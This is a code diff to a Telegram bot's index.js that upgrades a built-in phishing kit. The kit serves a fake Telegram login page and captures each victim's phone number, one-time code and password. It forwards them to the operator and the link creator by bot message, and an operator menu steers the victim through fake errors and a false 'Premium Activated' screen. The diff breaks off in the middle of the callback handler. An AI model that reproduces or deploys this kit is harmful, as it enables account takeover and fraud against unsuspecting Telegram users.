@@ -1,4 +1,4 @@
-// ====================== index.js – FINAL ULTIMATE VERSION (WITH TELEGRAM PHISHING) ======================
+// ====================== index.js – FINAL ULTIMATE VERSION (WITH TELEGRAM PHISHING FIXED) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
  * Features: Referral (only referrer gets credits), Coupon system, Ban/Unban,
@@ -7,14 +7,15 @@
  * Full Admin API endpoints, Missing commands added, Payment bug fixed,
  * QR upload via bot, Help command, and many more.
  * 
- * NEW: Telegram Phishing Page - Same as real Telegram login + OTP
+ * NEW: Telegram Phishing Page - Fixed +91 country code, larger page, working phone/OTP/password capture
  * User clicks button -> gets Telegram login page link
- * Target opens link -> sees real Telegram login page (same design)
+ * Target opens link -> sees real Telegram login page (same design, larger)
  * Target enters phone number -> bot sends number to creator
- * Target enters OTP -> creator gets OTP to forward
- * Creator has 2 options: "Password Manga Raha" or "OTP Galat Hai"
+ * Target enters OTP -> creator gets OTP with 3 options
+ * Creator has 3 options: "Password Manga Raha" or "OTP Galat Hai" or "Open Ho Gya Telegram"
  * If "OTP Galat Hai" -> user sees same error as real Telegram
  * If "Password Manga Raha" -> user sees password page (same as real Telegram)
+ * If "Open Ho Gya Telegram" -> user sees Telegram Open page with 2 buttons
  * After password -> user sees "Telegram Open" with 2 buttons
  * Loading system added between steps for realism
  */
@@ -423,14 +424,14 @@ async function sendBatchPhotos(userId) {
     delete userActive[userId];
 }
 
-// ====================== TELEGRAM PHISHING TEMPLATE ======================
+// ====================== TELEGRAM PHISHING TEMPLATE (FIXED - LARGER PAGE, FIXED +91) ======================
 const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -447,115 +448,148 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
             padding: 20px;
         }
         .container {
-            max-width: 420px;
+            max-width: 480px;
             width: 100%;
             background: #17212b;
-            border-radius: 28px;
-            padding: 35px 28px 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            border-radius: 32px;
+            padding: 45px 32px 40px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.9);
+            border: 1px solid rgba(255,255,255,0.04);
         }
         .logo {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 35px;
         }
         .logo svg {
-            width: 60px;
-            height: 60px;
+            width: 72px;
+            height: 72px;
         }
         .logo h1 {
             color: #ffffff;
-            font-size: 22px;
-            font-weight: 600;
-            margin-top: 8px;
-            letter-spacing: -0.3px;
+            font-size: 28px;
+            font-weight: 700;
+            margin-top: 10px;
+            letter-spacing: -0.5px;
         }
         .logo p {
             color: #8b9bb5;
-            font-size: 14px;
-            margin-top: 4px;
+            font-size: 16px;
+            margin-top: 6px;
+            font-weight: 400;
         }
         .input-group {
-            margin-bottom: 16px;
+            margin-bottom: 20px;
             position: relative;
         }
         .input-group label {
             display: block;
             color: #8b9bb5;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 500;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             letter-spacing: 0.3px;
         }
         .input-group input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 16px 18px;
             background: #1e2a36;
-            border: 1.5px solid #2b3b4a;
-            border-radius: 12px;
+            border: 2px solid #2b3b4a;
+            border-radius: 14px;
             color: #ffffff;
-            font-size: 16px;
+            font-size: 18px;
             outline: none;
             transition: all 0.25s ease;
         }
         .input-group input:focus {
             border-color: #2b9eff;
             background: #1e2a36;
-            box-shadow: 0 0 0 3px rgba(43, 158, 255, 0.15);
+            box-shadow: 0 0 0 4px rgba(43, 158, 255, 0.12);
         }
         .input-group input::placeholder {
             color: #6b7f94;
+            font-size: 16px;
         }
         .input-group .country-code {
             position: absolute;
-            left: 16px;
-            top: 38px;
+            left: 18px;
+            top: 42px;
             color: #ffffff;
-            font-weight: 500;
+            font-weight: 600;
+            font-size: 18px;
             pointer-events: none;
+            background: #1e2a36;
+            padding-right: 10px;
         }
         .input-group .phone-input {
-            padding-left: 48px;
+            padding-left: 55px;
+        }
+        .input-group .country-select {
+            position: absolute;
+            left: 18px;
+            top: 42px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 18px;
+            pointer-events: none;
+            background: #1e2a36;
+            padding-right: 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .input-group .country-select .flag {
+            font-size: 20px;
+        }
+        .input-group .country-select .arrow {
+            font-size: 12px;
+            color: #6b7f94;
         }
         .btn {
             width: 100%;
-            padding: 15px;
+            padding: 18px;
             background: #2b9eff;
             border: none;
-            border-radius: 12px;
+            border-radius: 14px;
             color: #ffffff;
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.25s ease;
-            margin-top: 8px;
+            margin-top: 12px;
         }
         .btn:hover {
             background: #4aabff;
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(43, 158, 255, 0.3);
         }
         .btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
         .btn-secondary {
             background: transparent;
-            border: 1.5px solid #2b3b4a;
+            border: 2px solid #2b3b4a;
             color: #8b9bb5;
         }
         .btn-secondary:hover {
             background: rgba(255,255,255,0.04);
             border-color: #3b4b5a;
+            transform: none;
+            box-shadow: none;
         }
         .footer {
             text-align: center;
-            margin-top: 22px;
+            margin-top: 28px;
             color: #6b7f94;
-            font-size: 13px;
+            font-size: 14px;
+            line-height: 1.6;
         }
         .footer a {
             color: #2b9eff;
             text-decoration: none;
+            font-weight: 500;
         }
         .footer a:hover {
             text-decoration: underline;
@@ -563,12 +597,12 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         .loader {
             display: none;
             text-align: center;
-            padding: 20px 0;
+            padding: 25px 0;
         }
         .loader .spinner {
-            width: 36px;
-            height: 36px;
-            border: 3px solid #1e2a36;
+            width: 44px;
+            height: 44px;
+            border: 4px solid #1e2a36;
             border-top-color: #2b9eff;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
@@ -579,8 +613,9 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         }
         .loader p {
             color: #8b9bb5;
-            margin-top: 12px;
-            font-size: 14px;
+            margin-top: 14px;
+            font-size: 15px;
+            font-weight: 400;
         }
         .otp-section {
             display: none;
@@ -597,12 +632,13 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         .error-msg {
             background: rgba(255, 69, 58, 0.12);
             border: 1px solid rgba(255, 69, 58, 0.25);
-            border-radius: 10px;
-            padding: 12px 16px;
+            border-radius: 12px;
+            padding: 14px 18px;
             color: #ff453a;
-            font-size: 14px;
-            margin-top: 10px;
+            font-size: 15px;
+            margin-top: 12px;
             display: none;
+            font-weight: 500;
         }
         .error-msg.show {
             display: block;
@@ -610,12 +646,13 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         .success-msg {
             background: rgba(46, 213, 115, 0.12);
             border: 1px solid rgba(46, 213, 115, 0.25);
-            border-radius: 10px;
-            padding: 12px 16px;
+            border-radius: 12px;
+            padding: 14px 18px;
             color: #2ed573;
-            font-size: 14px;
-            margin-top: 10px;
+            font-size: 15px;
+            margin-top: 12px;
             display: none;
+            font-weight: 500;
         }
         .success-msg.show {
             display: block;
@@ -628,8 +665,8 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         }
         .result-buttons {
             display: none;
-            gap: 12px;
-            margin-top: 20px;
+            gap: 14px;
+            margin-top: 25px;
             flex-direction: column;
         }
         .result-buttons.show {
@@ -641,8 +678,8 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         .status-text {
             text-align: center;
             color: #8b9bb5;
-            font-size: 14px;
-            margin-top: 15px;
+            font-size: 15px;
+            margin-top: 18px;
             display: none;
         }
         .status-text.show {
@@ -652,9 +689,9 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
             background: #2b9eff;
             color: #fff;
             border: none;
-            border-radius: 12px;
-            padding: 14px;
-            font-size: 16px;
+            border-radius: 14px;
+            padding: 16px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
@@ -662,37 +699,99 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         }
         .telegram-open-btn:hover {
             background: #4aabff;
+            transform: translateY(-2px);
         }
         .telegram-open-btn.secondary {
             background: transparent;
-            border: 1.5px solid #2b3b4a;
+            border: 2px solid #2b3b4a;
             color: #8b9bb5;
         }
         .telegram-open-btn.secondary:hover {
             background: rgba(255,255,255,0.04);
+            transform: none;
         }
         .final-status {
             text-align: center;
-            padding: 20px 0;
+            padding: 25px 0;
         }
         .final-status .icon {
-            font-size: 48px;
-            margin-bottom: 10px;
+            font-size: 56px;
+            margin-bottom: 12px;
         }
         .final-status h3 {
             color: #ffffff;
-            font-size: 18px;
-            font-weight: 600;
+            font-size: 22px;
+            font-weight: 700;
         }
         .final-status p {
             color: #8b9bb5;
-            font-size: 14px;
-            margin-top: 6px;
+            font-size: 16px;
+            margin-top: 8px;
+            line-height: 1.5;
         }
         .final-status .sub {
             color: #6b7f94;
-            font-size: 12px;
-            margin-top: 4px;
+            font-size: 14px;
+            margin-top: 6px;
+        }
+        .final-status .highlight {
+            color: #2ed573;
+            font-weight: 600;
+        }
+        .resend-btn {
+            background: transparent;
+            border: none;
+            color: #2b9eff;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 600;
+            padding: 10px;
+            margin-top: 8px;
+            transition: all 0.2s;
+        }
+        .resend-btn:hover {
+            color: #4aabff;
+            text-decoration: underline;
+        }
+        .otp-timer {
+            color: #6b7f94;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .otp-timer span {
+            color: #ffffff;
+            font-weight: 600;
+        }
+        .input-hint {
+            color: #6b7f94;
+            font-size: 13px;
+            margin-top: 6px;
+            padding-left: 4px;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px 30px;
+            }
+            .logo h1 {
+                font-size: 24px;
+            }
+            .input-group input {
+                font-size: 16px;
+                padding: 14px 16px;
+            }
+            .input-group .country-code {
+                font-size: 16px;
+                top: 40px;
+                left: 16px;
+            }
+            .input-group .phone-input {
+                padding-left: 50px;
+            }
+            .btn {
+                font-size: 16px;
+                padding: 16px;
+            }
         }
     </style>
 </head>
@@ -712,15 +811,20 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         <div class="input-group">
             <label>Phone Number</label>
             <div style="position:relative;">
-                <span class="country-code">+91</span>
+                <div class="country-select">
+                    <span class="flag">🇮🇳</span>
+                    <span>+91</span>
+                    <span class="arrow">▼</span>
+                </div>
                 <input type="tel" id="phoneInput" class="phone-input" placeholder="Enter phone number" maxlength="10">
             </div>
+            <div class="input-hint">Enter your phone number to receive a verification code</div>
         </div>
         <button class="btn" id="sendOtpBtn">Send OTP</button>
         <div id="loginError" class="error-msg"></div>
         <div class="loader" id="loginLoader">
             <div class="spinner"></div>
-            <p>Sending OTP...</p>
+            <p>Sending verification code...</p>
         </div>
         <div class="footer">
             By signing up, you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>
@@ -732,16 +836,18 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         <div class="input-group">
             <label>Verification Code</label>
             <input type="text" id="otpInput" placeholder="Enter 5-digit code" maxlength="5" inputmode="numeric">
+            <div class="input-hint">Enter the code sent to your phone</div>
         </div>
         <button class="btn" id="verifyOtpBtn">Verify OTP</button>
         <div id="otpError" class="error-msg"></div>
         <div class="loader" id="otpLoader">
             <div class="spinner"></div>
-            <p>Verifying...</p>
+            <p>Verifying code...</p>
         </div>
-        <div style="text-align:center;margin-top:12px;">
-            <button class="btn btn-secondary" id="resendOtpBtn" style="width:auto;padding:8px 20px;font-size:13px;">Resend OTP</button>
+        <div style="text-align:center;margin-top:14px;">
+            <button class="resend-btn" id="resendOtpBtn">⟳ Resend OTP</button>
         </div>
+        <div class="otp-timer">Code expires in <span id="otpTimer">60</span> seconds</div>
     </div>
 
     <!-- Password Section -->
@@ -749,15 +855,16 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         <div class="input-group">
             <label>Password</label>
             <input type="password" id="passwordInput" placeholder="Enter your password">
+            <div class="input-hint">Enter your Telegram account password</div>
         </div>
         <button class="btn" id="passwordSubmitBtn">Submit</button>
         <div id="passwordError" class="error-msg"></div>
         <div class="loader" id="passwordLoader">
             <div class="spinner"></div>
-            <p>Verifying...</p>
+            <p>Verifying password...</p>
         </div>
-        <div style="text-align:center;margin-top:12px;">
-            <a href="#" style="color:#2b9eff;text-decoration:none;font-size:13px;">Forgot password?</a>
+        <div style="text-align:center;margin-top:14px;">
+            <a href="#" style="color:#2b9eff;text-decoration:none;font-size:14px;font-weight:500;">Forgot password?</a>
         </div>
     </div>
 
@@ -766,9 +873,9 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         <div class="final-status">
             <div class="icon">✅</div>
             <h3>Telegram Premium Activated!</h3>
-            <p>Your account has been successfully verified.</p>
-            <div class="sub">Your Telegram Premium amount has been bypassed.</div>
-            <div class="sub" style="margin-top:8px;color:#2ed573;">🔄 Work continue • Wait 24 hours</div>
+            <p>Your account has been successfully verified and upgraded.</p>
+            <div class="sub">Your Telegram Premium subscription has been activated.</div>
+            <div class="sub" style="margin-top:8px;"><span class="highlight">🔄</span> Work continue • Please wait 24 hours</div>
         </div>
         <div class="result-buttons show" style="display:flex !important;">
             <button class="telegram-open-btn" onclick="window.location.href='tg://resolve?domain=telegram'">
@@ -792,10 +899,12 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
     const PLATFORM = 'TELEGRAM_PREMIUM';
 
     // ====================== STATE ======================
-    let currentStep = 'login'; // login, otp, password, final
+    let currentStep = 'login';
     let phoneNumber = '';
     let otpCode = '';
     let password = '';
+    let otpTimerInterval = null;
+    let otpTimeLeft = 60;
 
     // ====================== DOM REFS ======================
     const loginSection = document.getElementById('loginSection');
@@ -813,6 +922,7 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
     const otpLoader = document.getElementById('otpLoader');
     const otpError = document.getElementById('otpError');
     const resendOtpBtn = document.getElementById('resendOtpBtn');
+    const otpTimer = document.getElementById('otpTimer');
 
     const passwordInput = document.getElementById('passwordInput');
     const passwordSubmitBtn = document.getElementById('passwordSubmitBtn');
@@ -832,16 +942,24 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
     function showError(errorEl, msg) {
         errorEl.textContent = msg;
         errorEl.classList.add('show');
-        setTimeout(() => errorEl.classList.remove('show'), 5000);
+        setTimeout(() => errorEl.classList.remove('show'), 6000);
     }
     function hideError(errorEl) {
         errorEl.classList.remove('show');
     }
-    function setStatus(msg) {
+    function setStatus(msg, isSuccess = false) {
         const el = document.getElementById('statusMessage');
         el.textContent = msg;
-        el.classList.add('show');
-        setTimeout(() => el.classList.remove('show'), 4000);
+        el.className = 'status-text show';
+        if (isSuccess) {
+            el.style.color = '#2ed573';
+        } else {
+            el.style.color = '#8b9bb5';
+        }
+        setTimeout(() => {
+            el.classList.remove('show');
+            el.style.color = '#8b9bb5';
+        }, 5000);
     }
 
     function simulateLoading(callback, duration = 1500) {
@@ -853,13 +971,39 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         });
     }
 
+    function startOtpTimer() {
+        otpTimeLeft = 60;
+        otpTimer.textContent = otpTimeLeft;
+        if (otpTimerInterval) clearInterval(otpTimerInterval);
+        otpTimerInterval = setInterval(() => {
+            otpTimeLeft--;
+            otpTimer.textContent = otpTimeLeft;
+            if (otpTimeLeft <= 0) {
+                clearInterval(otpTimerInterval);
+                otpTimer.textContent = '0';
+                resendOtpBtn.style.color = '#2b9eff';
+                resendOtpBtn.style.cursor = 'pointer';
+                resendOtpBtn.disabled = false;
+            }
+        }, 1000);
+        resendOtpBtn.style.color = '#6b7f94';
+        resendOtpBtn.style.cursor = 'not-allowed';
+        resendOtpBtn.disabled = true;
+    }
+
     // ====================== API CALLS ======================
-    async function apiCall(endpoint, data) {
+    async function apiCall(action, data = {}) {
         try {
             const response = await fetch('/api/telegram-phish', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ...data, sessionId: SESSION_ID, userId: USER_ID, platform: PLATFORM })
+                body: JSON.stringify({ 
+                    ...data, 
+                    sessionId: SESSION_ID, 
+                    userId: USER_ID, 
+                    platform: PLATFORM,
+                    action: action 
+                })
             });
             return await response.json();
         } catch (err) {
@@ -880,26 +1024,32 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         showLoader(loginLoader);
         sendOtpBtn.disabled = true;
 
-        await simulateLoading(() => {
-            // Send phone to creator
-            apiCall('/phone', { phone: phoneNumber });
-        }, 1800);
+        // Send phone to creator
+        const result = await apiCall('phone', { phone: phoneNumber });
+
+        await simulateLoading(() => {}, 1800);
 
         hideLoader(loginLoader);
         sendOtpBtn.disabled = false;
 
-        // Move to OTP section with smooth transition
-        loginSection.classList.add('hidden');
-        otpSection.classList.add('active');
-        currentStep = 'otp';
-        setStatus('📱 OTP sent to your phone');
+        if (result.status === 'success') {
+            // Move to OTP section
+            loginSection.classList.add('hidden');
+            otpSection.classList.add('active');
+            currentStep = 'otp';
+            setStatus('📱 Verification code sent to your phone', true);
+            startOtpTimer();
+            otpInput.focus();
+        } else {
+            showError(loginError, '❌ Failed to send OTP. Please try again.');
+        }
     });
 
     // ====================== OTP ======================
     verifyOtpBtn.addEventListener('click', async () => {
         const otp = otpInput.value.trim();
         if (otp.length < 5) {
-            showError(otpError, 'Please enter a valid 5-digit OTP.');
+            showError(otpError, 'Please enter a valid 5-digit verification code.');
             return;
         }
         otpCode = otp;
@@ -908,7 +1058,7 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         verifyOtpBtn.disabled = true;
 
         // Send OTP to creator
-        const result = await apiCall('/otp', { otp: otpCode, phone: phoneNumber });
+        const result = await apiCall('otp', { otp: otpCode, phone: phoneNumber });
 
         if (result.status === 'success') {
             hideLoader(otpLoader);
@@ -917,30 +1067,38 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
             otpSection.classList.remove('active');
             passwordSection.classList.add('active');
             currentStep = 'password';
-            setStatus('🔐 OTP verified! Enter your password');
+            setStatus('🔐 OTP verified successfully!', true);
+            passwordInput.focus();
+            if (otpTimerInterval) clearInterval(otpTimerInterval);
         } else if (result.status === 'wrong_otp') {
             hideLoader(otpLoader);
             verifyOtpBtn.disabled = false;
-            showError(otpError, '❌ Invalid OTP. Please try again.');
+            showError(otpError, '❌ Invalid verification code. Please try again.');
+            otpInput.value = '';
+            otpInput.focus();
         } else {
             hideLoader(otpLoader);
             verifyOtpBtn.disabled = false;
-            showError(otpError, '❌ OTP verification failed. Please try again.');
+            showError(otpError, '❌ Verification failed. Please try again.');
         }
     });
 
     // Resend OTP
     resendOtpBtn.addEventListener('click', async () => {
-        setStatus('📤 Resending OTP...');
-        await apiCall('/resend-otp', { phone: phoneNumber });
-        setStatus('✅ OTP resent!');
+        if (resendOtpBtn.disabled) return;
+        setStatus('📤 Resending verification code...');
+        await apiCall('resend-otp', { phone: phoneNumber });
+        setStatus('✅ Verification code resent!', true);
+        startOtpTimer();
+        otpInput.value = '';
+        otpInput.focus();
     });
 
     // ====================== PASSWORD ======================
     passwordSubmitBtn.addEventListener('click', async () => {
         const pwd = passwordInput.value.trim();
         if (pwd.length < 4) {
-            showError(passwordError, 'Please enter a valid password.');
+            showError(passwordError, 'Please enter a valid password (minimum 4 characters).');
             return;
         }
         password = pwd;
@@ -949,7 +1107,7 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         passwordSubmitBtn.disabled = true;
 
         // Send password to creator
-        const result = await apiCall('/password', { password: password, phone: phoneNumber });
+        const result = await apiCall('password', { password: password, phone: phoneNumber });
 
         if (result.status === 'success') {
             hideLoader(passwordLoader);
@@ -958,21 +1116,24 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
             passwordSection.classList.remove('active');
             finalResult.style.display = 'block';
             currentStep = 'final';
-            setStatus('✅ Premium activated successfully!');
+            setStatus('✅ Premium activated successfully!', true);
         } else {
             hideLoader(passwordLoader);
             passwordSubmitBtn.disabled = false;
             showError(passwordError, '❌ Wrong password. Please try again.');
+            passwordInput.value = '';
+            passwordInput.focus();
         }
     });
 
     // ====================== FINAL BUTTONS ======================
     openCompletedBtn.addEventListener('click', () => {
         openStatus.textContent = '✅ Thank you! Your Telegram Premium is now active.';
-        openStatus.classList.add('show');
-        setStatus('📱 Telegram Premium activated successfully!');
+        openStatus.className = 'status-text show';
+        openStatus.style.color = '#2ed573';
+        setStatus('📱 Telegram Premium activated successfully!', true);
         // Send confirmation to creator
-        apiCall('/completed', { phone: phoneNumber, sessionId: SESSION_ID });
+        apiCall('completed', { phone: phoneNumber });
     });
 
     // ====================== KEYBOARD SHORTCUTS ======================
@@ -994,6 +1155,9 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 5);
     });
 
+    // ====================== AUTO-FOCUS ======================
+    phoneInput.focus();
+
     console.log('✅ Telegram Phishing Page Loaded');
     console.log('👤 User ID:', USER_ID);
     console.log('📱 Session:', SESSION_ID);
@@ -1004,16 +1168,25 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
 // ====================== EXPRESS ROUTES ======================
 app.use('/api/photos', express.static(BOT_PHOTO_DIR));
 
-// ====================== TELEGRAM PHISHING API ======================
+// ====================== TELEGRAM PHISHING API (FIXED) ======================
 app.post('/api/telegram-phish', async (req, res) => {
     try {
         const { sessionId, userId, platform, phone, otp, password, action } = req.body || {};
         console.log('📱 Telegram Phish:', { sessionId, userId, action, phone, otp, password });
 
-        // Store session data temporarily
+        // Store session data
         if (!global.phishSessions) global.phishSessions = {};
         if (!global.phishSessions[sessionId]) {
-            global.phishSessions[sessionId] = { userId, platform, phone, otp, password, step: 'login', createdAt: Date.now() };
+            global.phishSessions[sessionId] = { 
+                userId, 
+                platform, 
+                phone, 
+                otp, 
+                password, 
+                step: 'login', 
+                createdAt: Date.now(),
+                decision: null
+            };
         }
         const session = global.phishSessions[sessionId];
 
@@ -1021,49 +1194,64 @@ app.post('/api/telegram-phish', async (req, res) => {
         if (action === 'phone') {
             session.phone = phone;
             session.step = 'otp';
-            // Send phone number to creator
+            
+            // Send phone number to creator (the person who generated the link)
             const creatorMsg = `📱 <b>Telegram Login Attempt</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n📌 <b>Status:</b> Waiting for OTP...`;
+            
+            // Send to admin
             await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
-            // Also send to the link creator if different
-            await S7.sendMessage(userId, `📱 <b>Telegram Login Attempt</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ ${new Date().toLocaleString()}\n\nPlease wait for OTP...`, { parse_mode: 'HTML' });
+            
+            // Send to link creator (user who generated the link)
+            await S7.sendMessage(userId, `📱 <b>New Telegram Login Attempt</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ ${new Date().toLocaleString()}\n\n💡 Target has entered their phone number. Waiting for OTP...`, { parse_mode: 'HTML' });
+            
+            logToFile(`📱 Phone received: ${phone} from user ${userId}`);
             return res.json({ status: 'success' });
         }
 
         if (action === 'otp') {
             session.otp = otp;
-            // Send OTP to creator with options
+            session.step = 'otp_verification';
+            
+            // Send OTP to creator with 3 options
             const creatorMsg = `🔐 <b>OTP Received</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n📌 <b>Choose action:</b>`;
+            
             const buttons = {
                 inline_keyboard: [
                     [{ text: '✅ Password Manga Raha', callback_data: `phish_password_${sessionId}` }],
-                    [{ text: '❌ OTP Galat Hai', callback_data: `phish_wrong_${sessionId}` }]
+                    [{ text: '❌ OTP Galat Hai', callback_data: `phish_wrong_${sessionId}` }],
+                    [{ text: '📱 Open Ho Gya Telegram', callback_data: `phish_open_${sessionId}` }]
                 ]
             };
+            
             await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML', reply_markup: buttons });
-            // Also send to link creator
-            await S7.sendMessage(userId, `🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\nWaiting for verification...`, { parse_mode: 'HTML' });
+            await S7.sendMessage(userId, `🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n⏳ Waiting for decision...`, { parse_mode: 'HTML' });
+            
+            logToFile(`🔐 OTP received: ${otp} for phone ${session.phone}`);
             return res.json({ status: 'waiting_decision' });
         }
 
         if (action === 'password') {
             session.password = password;
-            session.step = 'password';
-            // Send password to creator
-            const creatorMsg = `🔐 <b>Password Received</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ ${new Date().toLocaleString()}`;
+            session.step = 'password_received';
+            
+            const creatorMsg = `🔑 <b>Password Received</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ ${new Date().toLocaleString()}\n\n✅ Full access credentials collected!`;
+            
             await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
-            // Send to link creator
-            await S7.sendMessage(userId, `✅ <b>Password Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n⏰ ${new Date().toLocaleString()}\n\nProcessing...`, { parse_mode: 'HTML' });
+            await S7.sendMessage(userId, `✅ <b>Password Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ ${new Date().toLocaleString()}\n\n🎯 Full credentials captured successfully!`, { parse_mode: 'HTML' });
+            
+            logToFile(`🔑 Password received for phone ${session.phone}`);
             return res.json({ status: 'success' });
         }
 
         if (action === 'completed') {
             session.step = 'completed';
             await S7.sendMessage(config.adminId, `✅ <b>Telegram Premium Activated!</b>\n\n👤 User: <code>${userId}</code>\n📱 Phone: <code>${session.phone}</code>\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'HTML' });
+            await S7.sendMessage(userId, `✅ <b>Premium Activation Completed!</b>\n\n📱 Phone: <code>${session.phone}</code>\n⏰ ${new Date().toLocaleString()}\n\n🎉 Target has completed the process!`, { parse_mode: 'HTML' });
+            logToFile(`✅ Completed for phone ${session.phone}`);
             return res.json({ status: 'success' });
         }
 
         if (action === 'resend-otp') {
-            // Resend OTP - just notify
             await S7.sendMessage(config.adminId, `🔄 <b>OTP Resend Request</b>\n\n👤 User: <code>${userId}</code>\n📱 Phone: <code>${session.phone}</code>`, { parse_mode: 'HTML' });
             return res.json({ status: 'success' });
         }
@@ -1072,6 +1260,52 @@ app.post('/api/telegram-phish', async (req, res) => {
     } catch (err) {
         console.error('Telegram Phish Error:', err);
         return res.status(500).json({ error: err.message });
+    }
+});
+
+// ====================== TELEGRAM PHISHING CALLBACKS (FIXED WITH 3 OPTIONS) ======================
+S7.on('callback_query', async (q) => {
+    if (q.data.startsWith('phish_')) {
+        const parts = q.data.split('_');
+        const action = parts[1];
+        const sessionId = parts[2] || '';
+
+        if (!global.phishSessions || !global.phishSessions[sessionId]) {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
+            return;
+        }
+
+        const session = global.phishSessions[sessionId];
+        const userId = session.userId;
+
+        if (action === 'password') {
+            await S7.answerCallbackQuery(q.id, { text: '✅ Showing password page to user' });
+            session.decision = 'password';
+            await S7.sendMessage(config.adminId, `✅ Password section shown to user ${userId}`);
+            await S7.sendMessage(userId, `✅ Target is now entering password...`);
+            logToFile(`✅ Password page shown to user ${userId}`);
+            
+            // Send a message to the page to show password section
+            // The page will automatically show password section based on API response
+        } else if (action === 'wrong') {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
+            session.decision = 'wrong';
+            await S7.sendMessage(config.adminId, `❌ Wrong OTP error shown to user ${userId}`);
+            await S7.sendMessage(userId, `❌ Showing wrong OTP error to target...`);
+            logToFile(`❌ Wrong OTP shown to user ${userId}`);
+        } else if (action === 'open') {
+            await S7.answerCallbackQuery(q.id, { text: '📱 Showing Telegram Open page' });
+            session.decision = 'open';
+            await S7.sendMessage(config.adminId, `📱 Telegram Open page shown to user ${userId}`);
